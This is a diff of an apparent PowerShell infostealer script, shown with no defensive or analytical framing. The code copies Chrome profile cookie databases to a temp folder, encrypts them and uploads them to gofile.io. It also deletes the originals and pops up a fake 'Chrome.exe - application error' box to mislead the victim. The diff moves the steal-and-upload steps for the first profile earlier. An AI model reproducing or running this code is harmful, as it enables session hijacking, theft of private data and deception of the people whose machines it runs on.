@@ -149,6 +149,14 @@ $op6 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 8\Network\Cookies"
 $dbp6 = "$env:TEMP\chromes_tihng5"
 
 Copy-Item $op $dbp -Force
+delete-data -op $op -p "s"
+Protect-File -FilePath $dbp -p "For_oNS."
+$fid=creat-FilesToGofile
+Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
+if ($kerch) {
+    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
+}
+
 Copy-Item $op2 $dbp2 -Force
 Copy-Item $op3 $dbp3 -Force
 Copy-Item $op4 $dbp4 -Force
@@ -171,14 +179,15 @@ $uploadUrl = "https://$($server).gofile.io/contents/uploadfile"
 $fid=creat-FilesToGofile
 
 #crypt
-Protect-File -FilePath $dbp -p "For_oNS."
+
+
 Protect-File -FilePath $dbp2 -p "For_oNS."
 Protect-File -FilePath $dbp3 -p "For_oNS."
 Protect-File -FilePath $dbp4 -p "For_oNS."
 Protect-File -FilePath $dbp5 -p "For_oNS."
 Protect-File -FilePath $dbp6 -p "For_oNS."
 #uplo
-Upload-FilesToGofile -FilePath "$dbp.crypt" -newFolderId $fid
+
 Upload-FilesToGofile -FilePath "$dbp2.crypt" -newFolderId $fid
 Upload-FilesToGofile -FilePath "$dbp3.crypt" -newFolderId $fid
 Upload-FilesToGofile -FilePath "$dbp4.crypt" -newFolderId $fid
@@ -198,9 +207,7 @@ delete-data -op $op6 -p "s"
 
 
 
-if ($kerch) {
-    [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "Chrome.exe - application error", "OK", "Error")
-}
+
 
 if ($sek) {
     [System.Windows.Forms.MessageBox]::Show("GPU process exited unexpectedly: exit_code=139", "msedge.exe - application error", "OK", "Error")
